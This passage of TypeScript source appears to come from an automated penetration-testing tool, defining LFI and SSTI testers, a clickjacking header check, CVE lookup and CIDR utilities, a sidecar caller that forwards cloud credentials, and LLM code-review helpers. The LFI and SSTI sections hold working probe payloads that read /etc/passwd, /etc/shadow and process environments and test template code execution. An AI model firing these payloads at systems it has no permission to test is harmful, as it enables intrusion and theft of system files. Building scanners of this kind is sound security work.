        { payload: '....//....//....//....//etc/passwd', name: 'Double dot filter bypass' },
        { payload: '..%2f..%2f..%2f..%2fetc%2fpasswd', name: 'URL-encoded traversal' },
        { payload: '..%252f..%252f..%252f..%252fetc%252fpasswd', name: 'Double-encoded traversal' },
        { payload: '/etc/passwd', name: 'Absolute path (etc/passwd)' },
        { payload: '../../../../etc/shadow', name: 'Shadow file attempt' },
        { payload: '../../../../windows/system32/drivers/etc/hosts', name: 'Windows hosts file' },
        { payload: '../../../../windows/win.ini', name: 'Windows win.ini' },
        { payload: 'php://filter/convert.base64-encode/resource=/etc/passwd', name: 'PHP filter wrapper' },
        { payload: '/proc/self/environ', name: 'Proc environ' },
      ];

      // Signatures that indicate successful file read
      const linuxFileSignatures = ['root:', 'bin:', 'daemon:', 'nobody:', '/bin/bash', '/bin/sh', 'nologin'];
      const windowsFileSignatures = ['[boot loader]', '[fonts]', '[extensions]', '[mci extensions]', 'for 16-bit app support'];
      const phpFilterSignature = /^[A-Za-z0-9+/=]{20,}/; // Base64 encoded content

      const results: { payload: string; name: string; vulnerable: boolean; indicator: string }[] = [];
      const vulnerabilities: string[] = [];

      // Get baseline response for comparison
      let baselineLength = 0;
      try {
        const baselineUrl = new URL(baseUrl);
        baselineUrl.searchParams.set(param, 'nonexistent_file_xyz');
        const baseResp = await fetch(baselineUrl.toString(), { signal: AbortSignal.timeout(5000) });
        const baseBody = await baseResp.text();
        baselineLength = baseBody.length;
      } catch {
        // Continue anyway
      }

      for (const { payload, name } of payloads) {
        try {
          const testUrl = new URL(baseUrl);
          testUrl.searchParams.set(param, payload);

          const response = await fetch(testUrl.toString(), {
            signal: AbortSignal.timeout(5000),
          });
          const body = await response.text();
          const bodyLower = body.toLowerCase();

          let vulnerable = false;
          let indicator = 'No LFI indicators';

          // Check for Linux file content
          const linuxMatches = linuxFileSignatures.filter(s => bodyLower.includes(s.toLowerCase()));
          if (linuxMatches.length >= 2) {
            vulnerable = true;
            indicator = `Linux file content detected (${linuxMatches.join(', ')})`;
          }

          // Check for Windows file content
          const windowsMatches = windowsFileSignatures.filter(s => bodyLower.includes(s.toLowerCase()));
          if (windowsMatches.length >= 1) {
            vulnerable = true;
            indicator = `Windows file content detected (${windowsMatches.join(', ')})`;
          }

          // Check for PHP filter (base64) response
          if (name.includes('PHP filter') && phpFilterSignature.test(body.trim())) {
            vulnerable = true;
            indicator = 'PHP filter wrapper returned base64 content';
          }

          // Check for significant response length difference suggesting file read
          if (!vulnerable && baselineLength > 0) {
            const lengthDiff = body.length - baselineLength;
            if (lengthDiff > 200 && response.status === 200) {
              indicator = `Larger response (+${lengthDiff} bytes) - possible file content`;
            }
          }

          // Check for error messages that confirm LFI attempt but filtered
          if (bodyLower.includes('no such file') || bodyLower.includes('failed to open') ||
              bodyLower.includes('include(') || bodyLower.includes('require(') ||
              bodyLower.includes('file_get_contents')) {
            indicator = 'File operation error message disclosed (path traversal partially works)';
          }

          results.push({ payload, name, vulnerable, indicator });
          if (vulnerable) {
            vulnerabilities.push(`${name}: ${indicator}`);
          }
        } catch {
          results.push({ payload, name, vulnerable: false, indicator: 'Request failed' });
        }
      }

      const output = results.map(r => {
        const status = r.vulnerable ? `VULNERABLE - ${r.indicator}` : r.indicator;
        return `  [${r.name}] ${status}`;
      }).join('\n');

      return {
        success: true,
        output: `LFI Test on ${baseUrl} (param: ${param}):\n${output}`,
        findings: vulnerabilities.length > 0 ? [{
          title: 'Local File Inclusion Vulnerability',
          severity: 'critical' as const,
          details: `Parameter "${param}" is vulnerable to LFI: ${vulnerabilities.join('; ')}`,
        }] : undefined,
      };
    },
  },
  {
    name: 'ssti_test',
    description: 'Test for Server-Side Template Injection with common payloads',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'URL with parameter to test', required: true },
      { name: 'param', type: 'string', description: 'Parameter name to test', required: true },
    ],
    handler: async (context) => {
      const baseUrl = context.parameters.url as string;
      const param = context.parameters.param as string;

      // Use large random factors so the product is a 9-10 digit number that will not
      // appear naturally on any page — eliminates false positives from common small numbers
      const factorA = Math.floor(Math.random() * 89999) + 10000; // 10000–99999
      const factorB = Math.floor(Math.random() * 89999) + 10000;
      const product = factorA * factorB;
      const productStr = String(product);
      // For Jinja2 string multiplication: use a short factor so the expected string is checkable
      const strFactorA = 7; // '7'*7 = '7777777'
      const strFactorB = 7;
      const strProduct = '7'.repeat(strFactorA * strFactorB); // 49 sevens

      const payloads = [
        { payload: `{{${factorA}*${factorB}}}`, expected: productStr, name: 'Jinja2/Twig double-brace' },
        { payload: `\${${factorA}*${factorB}}`, expected: productStr, name: 'FreeMarker/Spring EL dollar-brace' },
        { payload: `#{${factorA}*${factorB}}`, expected: productStr, name: 'Thymeleaf hash-brace' },
        { payload: `<%= ${factorA}*${factorB} %>`, expected: productStr, name: 'ERB/JSP expression tag' },
        { payload: `{{${strFactorA}*'${strFactorB}'}}`, expected: strProduct, name: 'Jinja2 string multiplication' },
        { payload: `\${${factorA}*${factorB}}`, expected: productStr, name: 'Java EL expression' },
        { payload: '{{config}}', expected: '', name: 'Jinja2 config access probe' },
        { payload: '{{self.__class__}}', expected: '', name: 'Jinja2 class introspection' },
        { payload: '${T(java.lang.Runtime)}', expected: '', name: 'Spring RCE probe' },
        { payload: `{php}echo ${factorA}*${factorB};{/php}`, expected: productStr, name: 'Smarty PHP tag' },
        { payload: `#set($x=${factorA}*${factorB})$x`, expected: productStr, name: 'Velocity #set' },
        { payload: `{{${factorA}|add:${factorB}}}`, expected: String(factorA + factorB), name: 'Django template filter' },
        { payload: `<#assign x=${factorA}*${factorB}>\${x}`, expected: productStr, name: 'FreeMarker assign' },
      ];

      const results: { payload: string; name: string; vulnerable: boolean; indicator: string }[] = [];
      const vulnerabilities: string[] = [];
      const allFindings: NonNullable<ToolResult['findings']> = [];

      for (const { payload, expected, name } of payloads) {
        try {
          const testUrl = new URL(baseUrl);
          testUrl.searchParams.set(param, payload);
          const urlStr = testUrl.toString();

          const response = await fetch(urlStr, {
            signal: AbortSignal.timeout(5000),
            headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST-SSTI/1.0)' },
          });
          const body = await response.text();
          const ct = response.headers.get('content-type') ?? '';

          let vulnerable = false;
          let indicator = 'Payload not evaluated';

          if (expected && body.includes(expected) && !body.includes(payload)) {
            vulnerable = true;
            indicator = `Expression evaluated: ${payload} = ${expected}`;
          }

          if (!expected && name.includes('config') && (body.includes('SECRET_KEY') || body.includes('DEBUG') || body.includes('<Config'))) {
            vulnerable = true;
            indicator = 'Template config object accessible';
          }

          if (!expected && name.includes('class') && (body.includes('__class__') || body.includes('TemplateReference') || body.includes('Undefined'))) {
            vulnerable = true;
            indicator = 'Template class introspection possible';
          }

          if (!vulnerable) {
            const templateErrors = [
              'TemplateSyntaxError', 'UndefinedError', 'jinja2', 'twig',
              'freemarker', 'thymeleaf', 'velocity', 'smarty',
              'template error', 'expression error', 'ELException',
            ];
            for (const errStr of templateErrors) {
              if (body.toLowerCase().includes(errStr.toLowerCase())) {
                indicator = `Template engine error: "${errStr}" - engine identified but expression blocked`;
                break;
              }
            }
          }

          results.push({ payload, name, vulnerable, indicator });
          if (vulnerable) {
            vulnerabilities.push(`${name}: ${indicator}`);
            // Capture the confirming packet
            const marker = expected || indicator;
            const matchIdx = body.indexOf(marker);
            const snippet = matchIdx >= 0
              ? body.slice(Math.max(0, matchIdx - 60), matchIdx + marker.length + 60).replace(/\s+/g, ' ')
              : body.slice(0, 200).replace(/\s+/g, ' ');
            const hostHeader = new URL(urlStr).hostname;
            allFindings.push({
              title: 'Server-Side Template Injection',
              severity: 'critical' as const,
              details: `Parameter "${param}" is vulnerable to SSTI via ${name}. ${indicator}`,
              provenance: 'tool' as const,
              toolName: 'ssti_test',
              toolOutput: indicator,
              httpRequest: `GET ${urlStr}\nHost: ${hostHeader}\nUser-Agent: T3MP3ST-SSTI/1.0`,
              httpResponse: `HTTP/1.1 ${response.status}\nContent-Type: ${ct}\n\n...${snippet}...`,
            });
          }
        } catch {
          results.push({ payload, name, vulnerable: false, indicator: 'Request failed' });
        }
      }

      const output = results.map(r => {
        const status = r.vulnerable ? `VULNERABLE - ${r.indicator}` : r.indicator;
        return `  [${r.name}] ${status}`;
      }).join('\n');

      return {
        success: true,
        output: `SSTI Test on ${baseUrl} (param: ${param}):\n${output}`,
        findings: allFindings.length > 0 ? allFindings : undefined,
      };
    },
  },
  {
    name: 'clickjacking_test',
    description: 'Check if a URL is protected against clickjacking (X-Frame-Options and CSP frame-ancestors)',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to test', required: true },
    ],
    handler: async (context) => {
      const url = context.parameters.url as string;

      try {
        const response = await fetch(url, {
          method: 'GET',
          signal: AbortSignal.timeout(10000),
        });

        const xfo = response.headers.get('x-frame-options');
        const csp = response.headers.get('content-security-policy');

        const issues: string[] = [];
        const info: string[] = [];

        // Analyze X-Frame-Options
        if (xfo) {
          const xfoUpper = xfo.toUpperCase().trim();
          info.push(`X-Frame-Options: ${xfo}`);
          if (xfoUpper === 'DENY') {
            info.push('  -> Framing completely denied (strong)');
          } else if (xfoUpper === 'SAMEORIGIN') {
            info.push('  -> Framing allowed from same origin only (good)');
          } else if (xfoUpper.startsWith('ALLOW-FROM')) {
            info.push(`  -> Framing allowed from specific origin (note: ALLOW-FROM is deprecated and not supported by modern browsers)`);
            issues.push('X-Frame-Options ALLOW-FROM is deprecated; use CSP frame-ancestors instead');
          } else {
            issues.push(`Invalid X-Frame-Options value: ${xfo}`);
          }
        } else {
          issues.push('X-Frame-Options header is missing');
        }

        // Analyze CSP frame-ancestors
        let hasFrameAncestors = false;
        if (csp) {
          const frameAncestorsMatch = csp.match(/frame-ancestors\s+([^;]+)/i);
          if (frameAncestorsMatch) {
            hasFrameAncestors = true;
            const value = frameAncestorsMatch[1].trim();
            info.push(`CSP frame-ancestors: ${value}`);
            if (value === "'none'") {
              info.push('  -> Framing completely denied via CSP (strong)');
            } else if (value === "'self'") {
              info.push('  -> Framing allowed from same origin via CSP (good)');
            } else {
              info.push(`  -> Custom frame-ancestors policy: ${value}`);
              if (value.includes('*')) {
                issues.push('CSP frame-ancestors contains wildcard - weakens clickjacking protection');
              }
            }
          }
        }

        if (!hasFrameAncestors && !xfo) {
          issues.push('No clickjacking protection found (neither X-Frame-Options nor CSP frame-ancestors)');
        } else if (!hasFrameAncestors) {
          info.push('CSP frame-ancestors: Not set (relying on X-Frame-Options only)');
        }

        const output = `Clickjacking Protection Test for ${url}:\n\n${info.join('\n')}\n\n${issues.length > 0 ? `Issues (${issues.length}):\n${issues.map(i => `  - ${i}`).join('\n')}` : 'Site appears protected against clickjacking'}`;

        return {
          success: true,
          output,
          findings: issues.length > 0 ? [{
            title: 'Clickjacking Protection Issues',
            severity: issues.some(i => i.includes('No clickjacking protection')) ? 'medium' as const : 'low' as const,
            details: issues.join('; '),
          }] : undefined,
        };
      } catch (error) {
        return {
          success: false,
          error: `Clickjacking test failed: ${error instanceof Error ? error.message : String(error)}`,
        };
      }
    },
  },

  // =============================================================================
  // ADDITIONAL UTILITY TOOLS
  // =============================================================================
  {
    name: 'cve_lookup',
    description: 'Look up CVEs from the built-in CVE database by keyword or CVE ID',
    category: 'util',
    parameters: [
      { name: 'query', type: 'string', description: 'Search keyword or CVE ID (e.g., "log4j" or "CVE-2021-44228")', required: true },
    ],
    handler: async (context) => {
      const query = (context.parameters.query as string).toLowerCase();

      const matches: CVEEntry[] = CVE_DATABASE.filter(cve =>
        cve.id.toLowerCase().includes(query) ||
        cve.description.toLowerCase().includes(query)
      );

      if (matches.length === 0) {
        return {
          success: true,
          output: `CVE Lookup for "${query}":\nNo matching CVEs found in the local database (${CVE_DATABASE.length} entries).`,
        };
      }

      const output = matches.map(cve =>
        `  ${cve.id} (CVSS: ${cve.cvss})\n    ${cve.description}`
      ).join('\n\n');

      return {
        success: true,
        output: `CVE Lookup for "${query}":\nFound ${matches.length} matching CVE(s):\n\n${output}`,
        findings: matches.filter(m => m.cvss >= 9.0).length > 0 ? [{
          title: 'Critical CVEs Found',
          severity: 'critical' as const,
          details: `Found ${matches.filter(m => m.cvss >= 9.0).length} critical CVEs (CVSS >= 9.0): ${matches.filter(m => m.cvss >= 9.0).map(m => m.id).join(', ')}`,
        }] : undefined,
      };
    },
  },
  {
    name: 'url_encode',
    description: 'URL encode or decode data',
    category: 'util',
    parameters: [
      { name: 'data', type: 'string', description: 'Data to encode or decode', required: true },
      { name: 'mode', type: 'string', description: 'Mode: "encode" or "decode"', required: false, default: 'encode' },
      { name: 'component', type: 'boolean', description: 'Use encodeURIComponent (true) or encodeURI (false)', required: false, default: true },
    ],
    handler: async (context) => {
      const data = context.parameters.data as string;
      const mode = (context.parameters.mode as string || 'encode').toLowerCase();
      const component = context.parameters.component !== false;

      try {
        let result: string;

        if (mode === 'decode') {
          result = component ? decodeURIComponent(data) : decodeURI(data);
        } else {
          result = component ? encodeURIComponent(data) : encodeURI(data);
        }

        return {
          success: true,
          output: `URL ${mode === 'decode' ? 'Decode' : 'Encode'} (${component ? 'component' : 'full URI'}):\nInput:  ${data}\nOutput: ${result}`,
        };
      } catch (error) {
        return {
          success: false,
          error: `URL ${mode} failed: ${error instanceof Error ? error.message : String(error)}`,
        };
      }
    },
  },
  {
    name: 'cidr_expand',
    description: 'Expand a CIDR notation into individual IP addresses (limited to /24 max)',
    category: 'util',
    parameters: [
      { name: 'cidr', type: 'string', description: 'CIDR notation (e.g., "192.168.1.0/24")', required: true },
    ],
    handler: async (context) => {
      const cidr = context.parameters.cidr as string;

      const cidrMatch = cidr.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\/(\d{1,2})$/);
      if (!cidrMatch) {
        return {
          success: false,
          error: `Invalid CIDR notation: ${cidr}. Expected format: x.x.x.x/prefix (e.g., 192.168.1.0/24)`,
        };
      }

      const ipStr = cidrMatch[1];
      const prefix = parseInt(cidrMatch[2], 10);

      if (prefix < 0 || prefix > 32) {
        return {
          success: false,
          error: `Invalid prefix length: /${prefix}. Must be between 0 and 32.`,
        };
      }

      if (prefix < 24) {
        return {
          success: false,
          error: `Prefix /${prefix} would generate ${Math.pow(2, 32 - prefix)} IPs. Maximum supported is /24 (256 IPs) to prevent excessive output.`,
        };
      }

      // Parse the base IP to a 32-bit integer
      const octets = ipStr.split('.').map(o => parseInt(o, 10));
      if (octets.some(o => o < 0 || o > 255)) {
        return {
          success: false,
          error: `Invalid IP address: ${ipStr}. Each octet must be 0-255.`,
        };
      }

      const ipInt = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3];
      const mask = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0;
      const network = (ipInt & mask) >>> 0;
      const broadcast = (network | (~mask >>> 0)) >>> 0;
      const totalHosts = broadcast - network + 1;

      const ips: string[] = [];
      for (let ip = network; ip <= broadcast; ip++) {
        ips.push(
          `${(ip >>> 24) & 255}.${(ip >>> 16) & 255}.${(ip >>> 8) & 255}.${ip & 255}`
        );
      }

      const networkIp = ips[0];
      const broadcastIp = ips[ips.length - 1];
      const usableRange = totalHosts > 2
        ? `${ips[1]} - ${ips[ips.length - 2]}`
        : 'N/A (point-to-point or host)';

      return {
        success: true,
        output: `CIDR Expansion for ${cidr}:\n` +
          `Network:    ${networkIp}\n` +
          `Broadcast:  ${broadcastIp}\n` +
          `Subnet Mask: ${((mask >>> 24) & 255)}.${((mask >>> 16) & 255)}.${((mask >>> 8) & 255)}.${mask & 255}\n` +
          `Total IPs:  ${totalHosts}\n` +
          `Usable Range: ${usableRange}\n` +
          `Usable Hosts: ${Math.max(0, totalHosts - 2)}\n\n` +
          `All IPs:\n${ips.map(ip => `  ${ip}`).join('\n')}`,
      };
    },
  },
];

// =============================================================================
// SUBPROCESS TOOL EXECUTION
// =============================================================================

/**
 * Check if a command-line tool is available on the system
 */
export async function isToolAvailable(command: string): Promise<boolean> {
  try {
    await execFileAsync('which', [command], { timeout: 5000 });
    return true;
  } catch {
    return false;
  }
}

/**
 * Run a subprocess tool with timeout and output capture
 */
export async function runSubprocess(
  command: string,
  args: string[],
  options?: { timeout?: number; maxOutput?: number; env?: NodeJS.ProcessEnv }
): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  const timeout = options?.timeout ?? 60000;
  const maxOutput = options?.maxOutput ?? 1024 * 1024; // 1MB

  try {
    const { stdout, stderr } = await execFileAsync(command, args, {
      timeout,
      maxBuffer: maxOutput,
      ...(options?.env ? { env: options.env } : {}),
    });
    return { stdout, stderr, exitCode: 0 };
  } catch (error: unknown) {
    const err = error as { stdout?: string; stderr?: string; code?: number; killed?: boolean };
    if (err.killed) {
      return { stdout: err.stdout || '', stderr: 'Process killed (timeout)', exitCode: -1 };
    }
    return { stdout: err.stdout || '', stderr: err.stderr || String(error), exitCode: err.code || 1 };
  }
}

// =============================================================================
// SIDECAR CALL HELPER — cert-pinned HTTPS to tempest-cloud / tempest-binary
// =============================================================================

async function callSidecar(
  sidecar: 'cloud' | 'binary' | 'sandbox',
  cmd: string,
  args: string[],
  env?: Record<string, string>,
  timeout = 120000
): Promise<{ stdout: string; stderr: string; exitCode: number; error?: string }> {
  const rawUrl   = sidecar === 'cloud'   ? process.env.CLOUD_SIDECAR_URL
                 : sidecar === 'sandbox' ? process.env.SANDBOX_SIDECAR_URL
                 :                         process.env.BINARY_SIDECAR_URL;
  const token    = sidecar === 'cloud'   ? process.env.CLOUD_SIDECAR_TOKEN
                 : sidecar === 'sandbox' ? process.env.SANDBOX_SIDECAR_TOKEN
                 :                         process.env.BINARY_SIDECAR_TOKEN;
  const certPath = sidecar === 'cloud'   ? '/certs/cloud-sidecar.crt'
                 : sidecar === 'sandbox' ? '/certs/sandbox-sidecar.crt'
                 :                         '/certs/binary-sidecar.crt';
  const label    = sidecar === 'cloud' ? 'CLOUD' : sidecar === 'sandbox' ? 'SANDBOX' : 'BINARY';

  if (!rawUrl)  return { stdout: '', stderr: '', exitCode: 1, error: `${label}_SIDECAR_URL not set — run scripts/generate-certs.sh and start the ${sidecar} sidecar` };
  if (!token)   return { stdout: '', stderr: '', exitCode: 1, error: `${label}_SIDECAR_TOKEN not set — run scripts/generate-certs.sh` };
  if (!existsSync(certPath)) return { stdout: '', stderr: '', exitCode: 1, error: `Sidecar TLS cert not found at ${certPath} — run scripts/generate-certs.sh` };

  // Bail before starting if the mission was already stopped
  if (_activeAbortSignal?.aborted) return { stdout: '', stderr: '', exitCode: -1, error: 'Aborted' };

  const ca     = readFileSync(certPath);
  const parsed = new URL(`${rawUrl}/run`);
  // Merge active mission credentials for cloud sidecar calls
  const mergedEnv = sidecar === 'cloud'
    ? { ...getActiveCloudEnv(), ...(env ?? {}) }
    : (env ?? {});
  const body   = JSON.stringify({ cmd, args, env: mergedEnv, timeout });

  return new Promise((resolve) => {
    const sig = _activeAbortSignal;
    const req = https.request(
      {
        hostname: parsed.hostname,
        port:     Number(parsed.port) || 8080,
        path:     '/run',
        method:   'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type':  'application/json',
          'Content-Length': Buffer.byteLength(body),
        },
        ca,
        timeout,
      },
      (res) => {
        let data = '';
        res.on('data', (chunk: Buffer) => { data += chunk.toString(); });
        res.on('end', () => {
          sig?.removeEventListener('abort', onAbort);
          try {
            const json = JSON.parse(data) as { stdout: string; stderr: string; exitCode: number; error?: string };
            resolve({ stdout: json.stdout ?? '', stderr: json.stderr ?? '', exitCode: json.exitCode ?? 0, error: json.error });
          } catch {
            resolve({ stdout: data, stderr: '', exitCode: 0 });
          }
        });
      }
    );
    const onAbort = () => { try { req.destroy(); } catch { /* noop */ } };
    sig?.addEventListener('abort', onAbort, { once: true });
    req.on('timeout', () => { sig?.removeEventListener('abort', onAbort); req.destroy(); resolve({ stdout: '', stderr: 'Sidecar request timed out', exitCode: -1 }); });
    req.on('error',   (err: Error) => {
      sig?.removeEventListener('abort', onAbort);
      if (sig?.aborted) { resolve({ stdout: '', stderr: '', exitCode: -1, error: 'Aborted' }); return; }
      resolve({ stdout: '', stderr: err.message, exitCode: 1, error: `Sidecar connection failed: ${err.message}` });
    });
    req.write(body);
    req.end();
  });
}

// =============================================================================
// MISSION CREDENTIAL STORE — cloud credentials injected per-mission
// =============================================================================

import type { CloudCredentials } from '../types/index.js';

/** Per-mission cloud env var cache (session-only, never persisted) */
const _missionCloudEnv = new Map<string, Record<string, string>>();
let _activeMissionId: string | null = null;

/**
 * Convert typed CloudCredentials into the flat env-var map that sidecars consume.
 */
export function buildCloudEnv(creds: CloudCredentials): Record<string, string> {
  const env: Record<string, string> = {};

  const aws = creds.aws;
  if (aws) {
    if (aws.accessKeyId)          env['AWS_ACCESS_KEY_ID']              = aws.accessKeyId;
    if (aws.secretAccessKey)      env['AWS_SECRET_ACCESS_KEY']          = aws.secretAccessKey;
    if (aws.sessionToken)         env['AWS_SESSION_TOKEN']              = aws.sessionToken;
    if (aws.region)               { env['AWS_DEFAULT_REGION'] = aws.region; env['AWS_REGION'] = aws.region; }
    if (aws.profile)              env['AWS_PROFILE']                    = aws.profile;
    if (aws.roleArn)              env['AWS_ROLE_ARN']                   = aws.roleArn;
    if (aws.roleSessionName)      env['AWS_ROLE_SESSION_NAME']          = aws.roleSessionName;
    if (aws.externalId)           env['AWS_EXTERNAL_ID']                = aws.externalId;
    if (aws.webIdentityTokenFile) env['AWS_WEB_IDENTITY_TOKEN_FILE']    = aws.webIdentityTokenFile;
  }

  const gcp = creds.gcp;
  if (gcp) {
    if (gcp.serviceAccountJson)           env['GOOGLE_APPLICATION_CREDENTIALS_JSON'] = gcp.serviceAccountJson;
    if (gcp.applicationCredentialsPath)   env['GOOGLE_APPLICATION_CREDENTIALS']      = gcp.applicationCredentialsPath;
    if (gcp.projectId)                    { env['GOOGLE_CLOUD_PROJECT'] = gcp.projectId; env['GCLOUD_PROJECT'] = gcp.projectId; env['CLOUDSDK_CORE_PROJECT'] = gcp.projectId; }
    if (gcp.impersonateServiceAccount)    env['CLOUDSDK_AUTH_IMPERSONATE_SERVICE_ACCOUNT'] = gcp.impersonateServiceAccount;
    if (gcp.accessToken)                  env['CLOUDSDK_AUTH_ACCESS_TOKEN'] = gcp.accessToken;
    if (gcp.configDir)                    env['CLOUDSDK_CONFIG'] = gcp.configDir;
  }

  const az = creds.azure;
  if (az) {
    if (az.tenantId)                env['AZURE_TENANT_ID']                     = az.tenantId;
    if (az.clientId)                env['AZURE_CLIENT_ID']                     = az.clientId;
    if (az.clientSecret)            env['AZURE_CLIENT_SECRET']                 = az.clientSecret;
    if (az.clientCertificatePath)   env['AZURE_CLIENT_CERTIFICATE_PATH']       = az.clientCertificatePath;
    if (az.clientCertificatePassword) env['AZURE_CLIENT_CERTIFICATE_PASSWORD'] = az.clientCertificatePassword;
    if (az.subscriptionId)          env['AZURE_SUBSCRIPTION_ID']               = az.subscriptionId;
    if (az.federatedTokenFile)      env['AZURE_FEDERATED_TOKEN_FILE']          = az.federatedTokenFile;
    if (az.authorityHost)           env['AZURE_AUTHORITY_HOST']                = az.authorityHost;
    if (az.useManagedIdentity && az.clientId) env['AZURE_CLIENT_ID'] = az.clientId; // user-assigned MSI
    if (az.cloud)     env['AZURE_CLOUD']     = az.cloud;
    if (az.username)  env['AZURE_USERNAME']  = az.username;
    if (az.password)  env['AZURE_PASSWORD']  = az.password;
  }

  return env;
}

export function setMissionCredentials(missionId: string, creds: CloudCredentials): void {
  _missionCloudEnv.set(missionId, buildCloudEnv(creds));
  _activeMissionId = missionId;
}

export function clearMissionCredentials(missionId: string): void {
  _missionCloudEnv.delete(missionId);
  if (_activeMissionId === missionId) _activeMissionId = null;
}

function getActiveCloudEnv(): Record<string, string> {
  if (_activeMissionId) {
    const env = _missionCloudEnv.get(_activeMissionId);
    if (env) return env;
  }
  // Fallback: check the most recently set mission
  const last = [..._missionCloudEnv.values()].at(-1);
  return last ?? {};
}

/**
 * External CLI tools that wrap real security tools when available.
 * These gracefully degrade — if the tool isn't installed, they return a helpful message.
 */
// =============================================================================
// LLM CODE REVIEW HELPERS
// =============================================================================

function walkSourceFiles(dir: string, maxDepth = 5, depth = 0): Array<{ path: string; relPath: string }> {
  if (depth >= maxDepth) return [];
  const results: Array<{ path: string; relPath: string }> = [];
  try {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const full = pathJoin(dir, entry.name);
      if (entry.isDirectory()) {
        if (['.git', 'node_modules', 'vendor', '__pycache__', '.venv', 'dist', 'build', '.next', 'coverage', 'testdata', '.nyc_output'].includes(entry.name)) continue;
        results.push(...walkSourceFiles(full, maxDepth, depth + 1));
      } else if (entry.isFile()) {
        const ext = entry.name.split('.').pop()?.toLowerCase() ?? '';
        if (['ts', 'js', 'go', 'py', 'rb', 'java', 'php', 'c', 'cpp', 'cs', 'rs'].includes(ext)) {
          results.push({ path: full, relPath: full.slice(dir.length + 1) });
        }
      }
    }
  } catch { /* skip unreadable dirs */ }
  return results;
}

function scoreForReview(
  files: Array<{ path: string; relPath: string }>,
  focus: string
): Array<{ path: string; relPath: string }> {
  const HIGH_RISK = [/auth/i, /login/i, /session/i, /jwt/i, /token/i, /password/i, /crypto/i, /secret/i, /route/i, /api/i, /handler/i, /controller/i, /endpoint/i, /middleware/i, /exec/i, /command/i, /shell/i, /query/i, /sql/i, /database/i, /upload/i, /file/i, /path/i, /deserializ/i, /eval/i, /config/i, /server/i, /app\./i, /main\./i, /index\./i, /component/i, /service/i, /guard/i, /resolver/i, /interceptor/i, /sanitiz/i, /xss/i, /render/i, /template/i];
  const FOCUS_BOOST: Record<string, RegExp[]> = {
    auth:      [/auth/i, /login/i, /session/i, /jwt/i, /token/i, /password/i, /guard/i, /interceptor/i],
    injection: [/exec/i, /query/i, /sql/i, /shell/i, /command/i, /eval/i, /route/i, /controller/i, /handler/i, /render/i, /template/i, /sanitiz/i],
    logic:     [/route/i, /handler/i, /controller/i, /middleware/i, /service/i, /resolver/i, /component/i],
    secrets:   [/config/i, /env/i, /secret/i, /credential/i, /key/i, /insecurity/i, /security/i],
  };
  return files
    .map(f => {
      let score = HIGH_RISK.filter(p => p.test(f.relPath)).length;
      score += (FOCUS_BOOST[focus] ?? []).filter(p => p.test(f.relPath)).length * 3;
      if (/test|spec|mock|stub|fixture|bench|sample|example/i.test(f.relPath)) score -= 3;
      return { ...f, score };
    })
    .sort((a, b) => (b as typeof a & { score: number }).score - (a as typeof a & { score: number }).score)
    .slice(0, 30);
}

function extractFunctionNear(filePath: string, targetLine: number): string {
  try {
    const ls = readFileSync(filePath, 'utf8').split('\n');
    for (let i = Math.min(targetLine - 1, ls.length - 1); i >= Math.max(0, targetLine - 30); i--) {
      const m = ls[i].match(/(?:func|function|def|async\s+function|async\s+def)\s+([A-Za-z_][A-Za-z0-9_]*)\s*[(<]/);
      if (m) return m[1];
    }
  } catch { /* best effort */ }
  return '';
}

function parseLLMFindings(response: string, repoUrl: string, clonePath: string): NonNullable<ToolResult['findings']> {
  const SEV: Record<string, 'critical' | 'high' | 'medium' | 'low' | 'info'> = {
    critical: 'critical', high: 'high', medium: 'medium', low: 'low', info: 'info',
  };
  try {
    // Try direct parse first — model is instructed to return ONLY JSON.
    // Fall back to extracting the outermost JSON object if there's prose around it.
    // NOTE: the old lazy regex [\s\S]*? stopped at the first } after "findings",
    // which is the closing brace of the first finding object — not the outer object.
    // Greedy match from first { to last } captures the full nested structure.
    let parsed: { findings?: unknown[] } | null = null;
    try {
      parsed = JSON.parse(response.trim()) as { findings?: unknown[] };
    } catch {
      const m = response.match(/\{[\s\S]*"findings"[\s\S]*\}/);
      if (m) { try { parsed = JSON.parse(m[0]) as { findings?: unknown[] }; } catch { /* give up */ } }
    }
    if (!parsed || !Array.isArray(parsed.findings)) return [];
    return (parsed.findings as Record<string, unknown>[])
      .filter(f => f?.title && f?.file)
      .map(f => {
        const sev = SEV[String(f.severity ?? '').toLowerCase()] ?? 'medium';
        const relFile = String(f.file).replace(/^\//, '');
        const lineNum = Number(f.line) || 0;
        let matchedCode = '';
        if (lineNum > 0) {
          try {
            const ls = readFileSync(pathJoin(clonePath, relFile), 'utf8').split('\n');
            matchedCode = ls.slice(Math.max(0, lineNum - 2), lineNum + 3).join('\n');
          } catch { /* skip */ }
        }
        const scanOutput = [
          String(f.description ?? ''),
          f.attack_vector ? `Attack vector: ${String(f.attack_vector)}` : '',
          matchedCode ? `Code:\n${matchedCode}` : '',
          f.poc ? `PoC:\n${String(f.poc)}` : '',
        ].filter(Boolean).join('\n');
        return {
          title: `LLM: ${String(f.title).slice(0, 120)}`,
          severity: sev,
          details: [`File: ${relFile}${lineNum ? ':' + lineNum : ''}`, scanOutput].filter(Boolean).join('\n'),
          provenance: 'tool' as const,
          toolName: 'llm_code_review',
          toolOutput: `${relFile}${lineNum ? ':' + lineNum : ''} — ${String(f.description ?? f.title).slice(0, 150)}`,
          scanCommand: `llm_code_review: ${repoUrl}`,
          scanOutput,
        };
      });
  } catch {
    return [];
  }
}

function parseValidationJSON(response: string): Record<string, unknown> {
  try {
    const m = response.match(/\{[\s\S]*\}/);
    return m ? (JSON.parse(m[0]) as Record<string, unknown>) : {};
  } catch {
    return {};
  }
}

// Resolve the local clone path for a repo URL.
// Tries the exact URL slug first, then http↔https variant (LLM may normalise the
// scheme differently from what was cloned).  Returns null when no clone exists.
function resolveClonePath(url: string): string | null {
  // Handle local:// pseudo-URLs pointing to extracted scan targets in /data/uploads/
  if (url.startsWith('local://')) {
    const name = url.slice(8);
    if (!name || name.includes('/') || name.includes('..') || name.includes('\0')) return null;
    const p = `/data/uploads/${name}`;
    return existsSync(p) ? p : null;
  }
  const variants = [url];
